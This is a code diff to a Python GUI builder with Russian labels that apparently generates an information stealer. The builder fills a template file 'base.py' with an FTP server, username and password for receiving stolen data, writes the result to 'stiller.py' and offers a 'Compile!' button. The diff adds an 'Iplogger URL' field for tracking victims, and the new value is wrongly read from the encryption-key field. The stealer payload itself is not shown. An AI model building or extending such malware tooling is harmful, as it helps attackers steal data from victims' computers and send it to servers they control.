@@ -5,7 +5,7 @@ from win32api import GetSystemMetrics
 from subprocess import Popen
 from re import sub
 from sys import exit, argv
-import os
+import os, sys
 
 import sys
 reload(sys)
@@ -16,11 +16,12 @@ def button_clicked():
     user = str(entry2.get())
     password = str(entry3.get())
     cryptokey = str(entry4.get())
+    iplogger = str(entry4.get())
 
     base = open("base.py").read()
     stiller = open("stiller.py","w")
 
-    logindata = ['FTPSERVER', 'FTPUSER', 'FTPPASS']
+    logindata = ['FTPSERVER', 'FTPUSER', 'FTPPASS', 'IPLOGGER']
 
     for data in logindata:
         i = int(logindata.index(data))
@@ -30,6 +31,8 @@ def button_clicked():
             item = user
         if i == 2:
             item = password
+        if i == 3:
+            item = iplogger
         base = sub(data, item, base)
 
     stiller.write(base)
@@ -49,12 +52,14 @@ root.resizable(False, False)
 
 label1 = Label(root, text=u"FTP сервер")
 label1.place(x=10, y=15)
-label1 = Label(root, text=u"FTP юзер")
-label1.place(x=10, y=38)
-label1 = Label(root, text=u"FTP пароль")
-label1.place(x=10, y=61)
-label1 = Label(root, text=u"Шифрование")
-label1.place(x=10, y=84)
+label2 = Label(root, text=u"FTP юзер")
+label2.place(x=10, y=38)
+label3 = Label(root, text=u"FTP пароль")
+label3.place(x=10, y=61)
+label4 = Label(root, text=u"Шифрование")
+label4.place(x=10, y=84)
+label5 = Label(root, text=u"Iplogger URL")
+label5.place(x=10, y=108)
 
 entry1 = Entry(root, width=28)
 entry1.place(x=110, y=15)
@@ -64,8 +69,10 @@ entry3 = Entry(root, width=28)
 entry3.place(x=110, y=61)
 entry4 = Entry(root, width=28)
 entry4.place(x=110, y=84)
+entry5 = Entry(root, width=28)
+entry5.place(x=110, y=108)
 
 button1 = Button(root, width=37,height=1, text=u"Скомпилировать!", command=button_clicked)
-button1.place(x=15, y=120)
+button1.place(x=15, y=140)
 
 root.mainloop()
